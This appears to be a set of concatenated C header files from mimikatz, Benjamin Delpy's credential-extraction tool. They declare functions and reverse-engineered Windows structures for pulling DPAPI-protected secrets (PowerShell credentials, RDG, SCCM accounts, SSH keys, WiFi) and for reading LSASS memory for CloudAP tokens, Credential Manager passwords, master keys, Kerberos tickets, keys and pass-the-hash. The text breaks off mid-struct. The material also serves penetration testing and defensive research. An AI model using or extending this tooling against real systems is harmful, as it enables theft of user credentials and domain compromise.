/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"
//#include "../../../../modules/kull_m_xml.h"

NTSTATUS kuhl_m_dpapi_powershell(int argc, wchar_t * argv[]);

BOOL kuhl_m_dpapi_powershell_check_against_one_type(IXMLDOMNode *pObj, LPCWSTR TypeName);
void kuhl_m_dpapi_powershell_try_SecureString(IXMLDOMNode *pObj, int argc, wchar_t * argv[]);
void kuhl_m_dpapi_powershell_credential(IXMLDOMNode *pObj, int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"
//#include "../../../../modules/kull_m_xml.h"
//#include "../../../../modules/kull_m_string.h"

NTSTATUS kuhl_m_dpapi_rdg(int argc, wchar_t * argv[]);

void kuhl_m_dpapi_rdg_CredentialsProfile(DWORD level, IXMLDOMNode *pNode, int argc, wchar_t * argv[]);
void kuhl_m_dpapi_rdg_Groups(DWORD level, IXMLDOMNode *pNode, int argc, wchar_t * argv[]);
void kuhl_m_dpapi_rdg_Servers(DWORD level, IXMLDOMNode *pNode, int argc, wchar_t * argv[]);
void kuhl_m_dpapi_rdg_LogonCredentials(DWORD level, IXMLDOMNode *pNode, int argc, wchar_t * argv[]);
void kuhl_m_dpapi_rdg_Credentials(DWORD level, IXMLDOMNode *pNode, int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"
//#include "../../../../modules/kull_m_string.h"
//#include "../../../../modules/kull_m_crypto.h"


typedef struct _SCCM_Policy_Secret {
	DWORD cbData;
	BYTE data[ANYSIZE_ARRAY];
} SCCM_Policy_Secret, *PSCCM_Policy_Secret;

NTSTATUS kuhl_m_dpapi_sccm_networkaccessaccount(int argc, wchar_t * argv[]);

BOOL kuhl_m_dpapi_sccm_XML_Data_to_bin(BSTR szData, PSCCM_Policy_Secret * ppPolicySecret, PDWORD pcbPolicySecret);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"
//#include "../../../../modules/kull_m_registry.h"
//#include "../../kuhl_m_token.h"

NTSTATUS kuhl_m_dpapi_ssh(int argc, wchar_t * argv[]);

void kuhl_m_dpapi_ssh_keys4user(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hUser, LPCWSTR szSID, int argc, wchar_t * argv[]);
BOOL CALLBACK kuhl_m_dpapi_ssh_impersonate(HANDLE hToken, DWORD ptid, PVOID pvArg);
void kuhl_m_dpapi_ssh_getKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hEntry, int argc, wchar_t * argv[], HANDLE hToken);
BOOL kuhl_m_dpapi_ssh_getRSAfromRAW(LPCBYTE data, DWORD szData);
void kuhl_m_dpapi_ssh_ParseKeyElement(PBYTE *pRaw, PBYTE *pData, DWORD *pszData);

typedef struct _KUHL_M_DPAPI_SSH_TOKEN{
	PSID pSid;
	HANDLE hToken;
} KUHL_M_DPAPI_SSH_TOKEN, *PKUHL_M_DPAPI_SSH_TOKEN;

/* Key types */
enum sshkey_types {
	KEY_RSA,
	KEY_DSA,
	KEY_ECDSA,
	KEY_ED25519,
	KEY_RSA_CERT,
	KEY_DSA_CERT,
	KEY_ECDSA_CERT,
	KEY_ED25519_CERT,
	KEY_XMSS,
	KEY_XMSS_CERT,
	KEY_UNSPEC
};

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_dpapi.h"

NTSTATUS kuhl_m_dpapi_wifi(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_dpapi_wwan(int argc, wchar_t * argv[]);



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_sekurlsa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_cloudap_package;

NTSTATUS kuhl_m_sekurlsa_cloudap(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_cloudap(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _KIWI_CLOUDAP_CACHE_UNK {
	DWORD unk0;
	DWORD unk1;
	DWORD unk2;
	DWORD unkSize;
	GUID guid;
	BYTE unk[64 /*ANYSIZE_ARRAY*/];
} KIWI_CLOUDAP_CACHE_UNK, *PKIWI_CLOUDAP_CACHE_UNK;

/*
debug643:00000139088EF3B0 dword_139088EF3B0 dd 96                 ; DATA XREF: debug630:00000139085F6F08
debug643:00000139088EF3B4 dd 0
debug643:00000139088EF3B8 dd 32
debug643:00000139088EF3BC dd 64
debug643:00000139088EF3C0 db 0, 2Ah, 0F0h, 0A0h, 9, 26h, 0C0h, 4Ah, 87h, 0F2h, 42h, 33h, 0B4h, 2Ch, 0DCh, 78h
debug643:00000139088EF3D0 db 0FAh, 4Ch, 0FAh, 90h, 64h, 56h, 63h, 69h, 2Fh, 0B6h, 0B0h, 84h, 41h, 44h, 58h, 4Bh
debug643:00000139088EF3D0 db 0A5h, 23h, 0BDh, 99h, 0EDh, 4Fh, 83h, 0F7h, 0DCh, 29h, 32h, 0D5h, 3Ah, 77h, 90h, 1
debug643:00000139088EF3D0 db 19h, 11h, 9Ch, 1, 45h, 28h, 0C0h, 59h, 0C0h, 2Eh, 0C7h, 7Eh, 3Bh, 6Bh, 0B8h, 2Dh
debug643:00000139088EF3D0 db 7, 4Ah, 1Ch, 0AEh, 70h, 81h, 16h, 49h, 27h, 10h, 26h, 0E4h, 9Ah, 72h, 34h, 0F2h
debug643:00000139088EF410 off_139088EF410 dq offset off_1390880D470
debug643:00000139088EF410                                         ; DATA XREF: debug634:off_1390880D470
debug643:00000139088EF410                                         ; debug634:000001390880D478
debug643:00000139088EF418 dq offset off_1390880D470
*/

typedef struct _KIWI_CLOUDAP_CACHE_LIST_ENTRY {
	struct _KIWI_CLOUDAP_CACHE_LIST_ENTRY *Flink;
	struct _KIWI_CLOUDAP_CACHE_LIST_ENTRY *Blink;
	DWORD unk0;
	PVOID LockList;
	PVOID unk1;
	PVOID unk2;
	PVOID unk3;
	PVOID unk4;
	PVOID unk5;
	DWORD unk6;
	DWORD unk7;
	DWORD unk8;
	DWORD unk9;
	PCWSTR unkLogin0;
	PCWSTR unkLogin1;
	wchar_t toname[64 + 1];
	PSID Sid;
	DWORD unk10;
	DWORD unk11;
	DWORD unk12;
	DWORD unk13;
	PKIWI_CLOUDAP_CACHE_UNK toDetermine; // dpapi ?
	PVOID unk14;
	DWORD cbPRT;
	PBYTE PRT;
	// ...
} KIWI_CLOUDAP_CACHE_LIST_ENTRY, *PKIWI_CLOUDAP_CACHE_LIST_ENTRY;

typedef struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY {
	struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY *Flink;
	struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY *Blink;
	DWORD unk0;
	DWORD unk1;
	LUID	LocallyUniqueIdentifier;
	DWORD64 unk2;
	DWORD64 unk3;
	PKIWI_CLOUDAP_CACHE_LIST_ENTRY cacheEntry;
	// ...
} KIWI_CLOUDAP_LOGON_LIST_ENTRY, *PKIWI_CLOUDAP_LOGON_LIST_ENTRY;

typedef struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY_11 {
	struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY *Flink;
	struct _KIWI_CLOUDAP_LOGON_LIST_ENTRY *Blink;
	DWORD unk0;
	DWORD unk1;
	DWORD unk2;
	LUID	LocallyUniqueIdentifier;
	DWORD unk3;
	DWORD unk4;
	DWORD unk5;
	DWORD unk6;
	PKIWI_CLOUDAP_CACHE_LIST_ENTRY cacheEntry;
	// ...
} KIWI_CLOUDAP_LOGON_LIST_ENTRY_11, *PKIWI_CLOUDAP_LOGON_LIST_ENTRY_11;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_sekurlsa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_credman_package;

NTSTATUS kuhl_m_sekurlsa_credman(int argc, wchar_t * argv[]);
void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_credman(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);

typedef struct _CREDMAN_INFOS {
	ULONG	structSize;
	ULONG	offsetFLink;
	ULONG	offsetUsername;
	ULONG	offsetDomain;
	ULONG	offsetCbPassword;
	ULONG	offsetPassword;
} CREDMAN_INFOS, *PCREDMAN_INFOS;

typedef struct _KIWI_CREDMAN_LIST_ENTRY_5 {
	ULONG cbEncPassword;
	PWSTR encPassword;
	ULONG unk0;
	ULONG unk1;
	PVOID unk2;
	PVOID unk3;
	PWSTR UserName;
	ULONG cbUserName;
	struct _KIWI_CREDMAN_LIST_ENTRY *Flink;
	struct _KIWI_CREDMAN_LIST_ENTRY *Blink;
	UNICODE_STRING server1;
	PVOID unk6;
	PVOID unk7;
	UNICODE_STRING user;
	ULONG unk8;
	UNICODE_STRING server2;
} KIWI_CREDMAN_LIST_ENTRY_5, *PKIWI_CREDMAN_LIST_ENTRY_5;

typedef struct _KIWI_CREDMAN_LIST_ENTRY_60 {
	ULONG cbEncPassword;
	PWSTR encPassword;
	ULONG unk0;
	ULONG unk1;
	PVOID unk2;
	PVOID unk3;
	PWSTR UserName;
	ULONG cbUserName;
	struct _KIWI_CREDMAN_LIST_ENTRY *Flink;
	struct _KIWI_CREDMAN_LIST_ENTRY *Blink;
	UNICODE_STRING type;
	PVOID unk5;
	UNICODE_STRING server1;
	PVOID unk6;
	PVOID unk7;
	PVOID unk8;
	PVOID unk9;
	PVOID unk10;
	UNICODE_STRING user;
	ULONG unk11;
	UNICODE_STRING server2;
} KIWI_CREDMAN_LIST_ENTRY_60, *PKIWI_CREDMAN_LIST_ENTRY_60;

typedef struct _KIWI_CREDMAN_LIST_ENTRY {
	ULONG cbEncPassword;
	PWSTR encPassword;
	ULONG unk0;
	ULONG unk1;
	PVOID unk2;
	PVOID unk3;
	PWSTR UserName;
	ULONG cbUserName;
	struct _KIWI_CREDMAN_LIST_ENTRY *Flink;
	struct _KIWI_CREDMAN_LIST_ENTRY *Blink;
	LIST_ENTRY unk4;
	UNICODE_STRING type;
	PVOID unk5;
	UNICODE_STRING server1;
	PVOID unk6;
	PVOID unk7;
	PVOID unk8;
	PVOID unk9;
	PVOID unk10;
	UNICODE_STRING user;
	ULONG unk11;
	UNICODE_STRING server2;
} KIWI_CREDMAN_LIST_ENTRY, *PKIWI_CREDMAN_LIST_ENTRY;

typedef struct _KIWI_CREDMAN_LIST_STARTER {
	ULONG unk0;
	PKIWI_CREDMAN_LIST_ENTRY start;
	//...
} KIWI_CREDMAN_LIST_STARTER, *PKIWI_CREDMAN_LIST_STARTER;

typedef struct _KIWI_CREDMAN_SET_LIST_ENTRY {
	struct _KIWI_CREDMAN_SET_LIST_ENTRY *Flink;
	struct _KIWI_CREDMAN_SET_LIST_ENTRY *Blink;
	ULONG unk0;
	PKIWI_CREDMAN_LIST_STARTER list1;
	PKIWI_CREDMAN_LIST_STARTER list2;
	// ...
} KIWI_CREDMAN_SET_LIST_ENTRY, *PKIWI_CREDMAN_SET_LIST_ENTRY;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_sekurlsa.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_dpapi_lsa_package, kuhl_m_sekurlsa_dpapi_svc_package;

NTSTATUS kuhl_m_sekurlsa_dpapi(int argc, wchar_t * argv[]);
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);

typedef struct _KIWI_MASTERKEY_CACHE_ENTRY {
	struct _KIWI_MATERKEY_CACHE_ENTRY *Flink;
	struct _KIWI_MATERKEY_CACHE_ENTRY *Blink;
	LUID LogonId;
	GUID KeyUid;
	FILETIME insertTime;
	ULONG keySize;
	BYTE  key[ANYSIZE_ARRAY];
} KIWI_MASTERKEY_CACHE_ENTRY, *PKIWI_MASTERKEY_CACHE_ENTRY;

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m_sekurlsa.h"
//#include "../../kerberos/kuhl_m_kerberos_ticket.h"
//#include "../modules/kull_m_crypto_system.h"
//#include "../modules/kull_m_file.h"

KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package;

NTSTATUS kuhl_m_sekurlsa_kerberos(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_kerberos_tickets(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_sekurlsa_kerberos_keys(int argc, wchar_t * argv[]);

typedef void (CALLBACK * PKUHL_M_SEKURLSA_KERBEROS_CRED_CALLBACK) (IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);

typedef struct _KIWI_KERBEROS_ENUM_DATA {
	PKUHL_M_SEKURLSA_KERBEROS_CRED_CALLBACK callback;
	PVOID optionalData;
} KIWI_KERBEROS_ENUM_DATA, *PKIWI_KERBEROS_ENUM_DATA;

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData);
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_generic(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);
void kuhl_m_sekurlsa_enum_generic_callback_kerberos(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL PKIWI_KERBEROS_ENUM_DATA pEnumData);
void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN DWORD grp, IN PVOID tickets, IN BOOL isFile);

void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_passwords(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);
void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);
void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_keys(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS LocalKerbSession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);

BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_kerberos_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData);
void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN KULL_M_MEMORY_ADDRESS Localkerbsession, IN KULL_M_MEMORY_ADDRESS RemoteLocalKerbSession, IN OPTIONAL LPVOID pOptionalData);

wchar_t * kuhl_m_sekurlsa_kerberos_generateFileName(PLUID LogonId, const DWORD grp, const DWORD index, PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext);

PKIWI_KERBEROS_TICKET kuhl_m_sekurlsa_kerberos_createTicket(PBYTE pTicket, PKULL_M_MEMORY_HANDLE hLSASS);
void kuhl_m_sekurlsa_kerberos_createExternalName(PKERB_EXTERNAL_NAME *pExternalName, PKULL_M_MEMORY_HANDLE hLSASS);
void kuhl_m_sekurlsa_kerberos_createKiwiKerberosBuffer(PKIWI_KERBEROS_BUFFER pBuffer, PKULL_M_MEMORY_HANDLE hLSASS);

typedef struct _KERB_INFOS {
	LONG	offsetLuid;
	LONG	offsetCreds;
	LONG	offsetTickets[3];
	LONG	offsetSmartCard;
	SIZE_T	structSize;

	LONG	offsetServiceName;
	LONG	offsetTargetName;
	LONG	offsetDomainName;
	LONG	offsetTargetDomainName;
	LONG	offsetDescription;
	LONG	offsetAltTargetDomainName;
	LONG	offsetClientName;
	LONG	offsetTicketFlags;
	LONG	offsetKeyType;
	LONG	offsetKey;
	LONG	offsetStartTime;
	LONG	offsetEndTime;
	LONG	offsetRenewUntil;
	LONG	offsetTicketEncType;
	LONG	offsetTicket;
	LONG	offsetTicketKvno;
	SIZE_T	structTicketSize;

	LONG	offsetKeyList;
	SIZE_T	structKeyListSize;

	LONG	offsetHashGeneric;
	SIZE_T	structKeyPasswordHashSize;

	LONG	offsetSizeOfCsp;
	LONG	offsetNames;
	SIZE_T	structCspInfosSize;

	LONG	offsetPasswordErase;
	SIZE_T	passwordEraseSize;
} KERB_INFOS, *PKERB_INFOS;

typedef struct _KERB_SMARTCARD_CSP_INFO_5 {
	DWORD dwCspInfoLen;
	PVOID ContextInformation;
	ULONG nCardNameOffset;
	ULONG nReaderNameOffset;
	ULONG nContainerNameOffset;
	ULONG nCSPNameOffset;
	WCHAR bBuffer[ANYSIZE_ARRAY];
} KERB_SMARTCARD_CSP_INFO_5, *PKERB_SMARTCARD_CSP_INFO_5;

typedef struct _KERB_SMARTCARD_CSP_INFO {
	DWORD dwCspInfoLen;
	DWORD MessageType;
	union {
		PVOID   ContextInformation;
		ULONG64 SpaceHolderForWow64;
	};
	DWORD flags;
	DWORD KeySpec;
	ULONG nCardNameOffset;
	ULONG nReaderNameOffset;
	ULONG nContainerNameOffset;
	ULONG nCSPNameOffset;
	WCHAR bBuffer[ANYSIZE_ARRAY];
} KERB_SMARTCARD_CSP_INFO, *PKERB_SMARTCARD_CSP_INFO;

typedef struct _KIWI_KERBEROS_CSP_INFOS_5 {
	LSA_UNICODE_STRING PinCode;
	PVOID unk0;
	PVOID unk1;
	PVOID CertificateInfos;

	PVOID unkData;	// 0 = CspData
	DWORD Flags;	// 1 = CspData (not 0x21)


	DWORD CspDataLength;
	KERB_SMARTCARD_CSP_INFO_5 CspData;
} KIWI_KERBEROS_CSP_INFOS_5, *PKIWI_KERBEROS_CSP_INFOS_5;

typedef struct _KIWI_KERBEROS_CSP_INFOS_60 {
	LSA_UNICODE_STRING PinCode;
	PVOID unk0;
	PVOID unk1;
	PVOID CertificateInfos;

	PVOID unkData;	// 0 = CspData
	DWORD Flags;	// 0 = CspData
	DWORD unkFlags;	// 0x141

	DWORD CspDataLength;
	KERB_SMARTCARD_CSP_INFO CspData;
} KIWI_KERBEROS_CSP_INFOS_60, *PKIWI_KERBEROS_CSP_INFOS_60;

typedef struct _KIWI_KERBEROS_CSP_INFOS_62 {
	LSA_UNICODE_STRING PinCode;
	PVOID unk0;
	PVOID unk1;
	PVOID CertificateInfos;
	PVOID unk2;
	PVOID unkData;	// 0 = CspData
	DWORD Flags;	// 0 = CspData
	DWORD unkFlags;	// 0x141 (not 0x61)

	DWORD CspDataLength;
	KERB_SMARTCARD_CSP_INFO CspData;
} KIWI_KERBEROS_CSP_INFOS_62, *PKIWI_KERBEROS_CSP_INFOS_62;

typedef struct _KIWI_KERBEROS_CSP_INFOS_10 {
	LSA_UNICODE_STRING PinCode;
	PVOID unk0;
	PVOID unk1;
	PVOID CertificateInfos;
	PVOID unk2;
	PVOID unkData;	// 0 = CspData
	DWORD Flags;	// 0 = CspData
	DWORD unkFlags;	// 0x141 (not 0x61)
	PVOID unk3;
	DWORD CspDataLength;
	KERB_SMARTCARD_CSP_INFO CspData;
} KIWI_KERBEROS_CSP_INFOS_10, *PKIWI_KERBEROS_CSP_INFOS_10;

typedef struct _KIWI_KERBEROS_LOGON_SESSION_51 {
	ULONG		UsageCount;
	LIST_ENTRY	unk0;
	LIST_ENTRY	unk1;
	PVOID		unk2;
	ULONG		unk3;	// filetime.1 ?
	ULONG		unk4;	// filetime.2 ?
	PVOID		unk5;
	PVOID		unk6;
	PVOID		unk7;
	LUID		LocallyUniqueIdentifier;
#if defined(_M_IX86)
	ULONG		unkAlign;
#endif
	FILETIME	unk8;
	PVOID		unk9;
	ULONG		unk10;	// filetime.1 ?
	ULONG		unk11;	// filetime.2 ?
	PVOID		unk12;
	PVOID		unk13;
	PVOID		unk14;
	KIWI_GENERIC_PRIMARY_CREDENTIAL	credentials;
	ULONG		unk15;
	ULONG		unk16;
	ULONG		unk17;
	ULONG		unk18;
	PVOID		unk19;
	PVOID		unk20;
	PVOID		unk21;
	PVOID		unk22;
	PVOID		pKeyList;
	PVOID		unk24;
	LIST_ENTRY	Tickets_1;
	LIST_ENTRY	Tickets_2;
	LIST_ENTRY	Tickets_3;
	PVOID		SmartcardInfos;
} KIWI_KERBEROS_LOGON_SESSION_51, *PKIWI_KERBEROS_LOGON_SESSION_51;

typedef struct _KIWI_KERBEROS_LOGON_SESSION {
	ULONG		UsageCount;
	LIST_ENTRY	unk0;
	PVOID		unk1;
	ULONG		unk2;	// filetime.1 ?
	ULONG		unk3;	// filetime.2 ?
	PVOID		unk4;
	PVOID		unk5;
	PVOID		unk6;
	LUID		LocallyUniqueIdentifier;
#if defined(_M_IX86)
	ULONG		unkAlign;
#endif
	FILETIME	unk7;
	PVOID		unk8;
	ULONG		unk9;	// filetime.1 ?
	ULONG		unk10;	// filetime.2 ?
	PVOID		unk11;
	PVOID		unk12;
	PVOID		unk13;
	KIWI_GENERIC_PRIMARY_CREDENTIAL	credentials;
	ULONG		unk14;
	ULONG		unk15;
	ULONG		unk16;
	ULONG		unk17;
	PVOID		unk18;
	PVOID		unk19;
	PVOID		unk20;
	PVOID		unk21;
	PVOID		pKeyList;
	PVOID		unk23;
	LIST_ENTRY	Tickets_1;
	FILETIME	unk24;
	LIST_ENTRY	Tickets_2;
	FILETIME	unk25;
	LIST_ENTRY	Tickets_3;
	FILETIME	unk26;
	PVOID		SmartcardInfos;
} KIWI_KERBEROS_LOGON_SESSION, *PKIWI_KERBEROS_LOGON_SESSION;

typedef struct _KIWI_KERBEROS_10_PRIMARY_CREDENTIAL
{
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID		unk0;
	LSA_UNICODE_STRING Password;
} KIWI_KERBEROS_10_PRIMARY_CREDENTIAL, *PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL;

typedef struct _KIWI_KERBEROS_LOGON_SESSION_10 {
	ULONG		UsageCount;
	LIST_ENTRY	unk0;
	PVOID		unk1;
	ULONG		unk1b;
	FILETIME	unk2;
	PVOID		unk4;
	PVOID		unk5;
	PVOID		unk6;
	LUID		LocallyUniqueIdentifier;
	FILETIME	unk7;
	PVOID		unk8;
	ULONG		unk8b;
	FILETIME	unk9;
	PVOID		unk11;
	PVOID		unk12;
	PVOID		unk13;
#if defined(_M_IX86)
	ULONG		unkAlign;
#endif
	KIWI_KERBEROS_10_PRIMARY_CREDENTIAL	credentials;
	ULONG		unk14;
	ULONG		unk15;
	ULONG		unk16;
	ULONG		unk17;
	//PVOID		unk18;
	PVOID		unk19;
	PVOID		unk20;
	PVOID		unk21;
	PVOID		unk22;
	PVOID		unk23;
	PVOID		unk24;
	PVOID		unk25;
	PVOID		pKeyList;
	PVOID		unk26;
	LIST_ENTRY	Tickets_1;
	FILETIME	unk27;
	LIST_ENTRY	Tickets_2;
	FILETIME	unk28;
	LIST_ENTRY	Tickets_3;
	FILETIME	unk29;
	PVOID		SmartcardInfos;
} KIWI_KERBEROS_LOGON_SESSION_10, *PKIWI_KERBEROS_LOGON_SESSION_10;

typedef struct _KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO
{
	DWORD StructSize;
	struct _LSAISO_DATA_BLOB *isoBlob; // aligned;
} KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO, *PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO;

typedef struct _KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607
{
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID		unkFunction;
	DWORD		type; // or flags 2 = normal, 1 = ISO
	union {
		LSA_UNICODE_STRING Password;
		KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607_ISO IsoPassword;
	};
} KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607, *PKIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607;

typedef struct _KIWI_KERBEROS_LOGON_SESSION_10_1607 {
	ULONG		UsageCount;
	LIST_ENTRY	unk0;
	PVOID		unk1;
	ULONG		unk1b;
	FILETIME	unk2;
	PVOID		unk4;
	PVOID		unk5;
	PVOID		unk6;
	LUID		LocallyUniqueIdentifier;
	FILETIME	unk7;
	PVOID		unk8;
	ULONG		unk8b;
	FILETIME	unk9;
	PVOID		unk11;
	PVOID		unk12;
	PVOID		unk13;
#if defined(_M_IX86)
	ULONG		unkAlign;
#endif
	KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607	credentials;
	ULONG		unk14;
	ULONG		unk15;
	ULONG		unk16;
	ULONG		unk17;
	PVOID		unk18;
	PVOID		unk19;
	PVOID		unk20;
	PVOID		unk21;
	PVOID		unk22;
	PVOID		unk23;
	PVOID		unk24;
	PVOID		unk25;
	PVOID		pKeyList;
	PVOID		unk26;
	LIST_ENTRY	Tickets_1;
	FILETIME	unk27;
	LIST_ENTRY	Tickets_2;
	FILETIME	unk28;
	LIST_ENTRY	Tickets_3;
	FILETIME	unk29;
	PVOID		SmartcardInfos;
} KIWI_KERBEROS_LOGON_SESSION_10_1607, *PKIWI_KERBEROS_LOGON_SESSION_10_1607;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_51 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	PKERB_EXTERNAL_NAME	ClientName;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	PVOID		unk6;
	PVOID		unk7;
	PVOID		unk8;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk9;
	ULONG		unk10;
	PCWSTR		domain;
	ULONG		unk11;
	PVOID		strangeNames;
	ULONG		unk12;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_51, *PKIWI_KERBEROS_INTERNAL_TICKET_51;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_52 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
	PVOID		unk3;
	PVOID		unk4;
	PVOID		unk5;
	FILETIME	StartTime;
	FILETIME	EndTime;
	FILETIME	RenewUntil;
	ULONG		unk6;
	ULONG		unk7;
	PCWSTR		domain;
	ULONG		unk8;
	PVOID		strangeNames;
	ULONG		unk9;
	ULONG		TicketEncType;
	ULONG		TicketKvno;
	KIWI_KERBEROS_BUFFER	Ticket;
} KIWI_KERBEROS_INTERNAL_TICKET_52, *PKIWI_KERBEROS_INTERNAL_TICKET_52;

typedef struct _KIWI_KERBEROS_INTERNAL_TICKET_60 {
	LIST_ENTRY	This;
	PVOID		unk0;
	PVOID		unk1;
	PKERB_EXTERNAL_NAME	ServiceName;
	PKERB_EXTERNAL_NAME	TargetName;
	LSA_UNICODE_STRING	DomainName;
	LSA_UNICODE_STRING	TargetDomainName;
	LSA_UNICODE_STRING	Description;
	LSA_UNICODE_STRING	AltTargetDomainName;
	//LSA_UNICODE_STRING	KDCServer;	//?
	PKERB_EXTERNAL_NAME	ClientName;
	PVOID		name0;
	ULONG		TicketFlags;
	ULONG		unk2;
	ULONG		KeyType;
	KIWI_KERBEROS_BUFFER	Key;
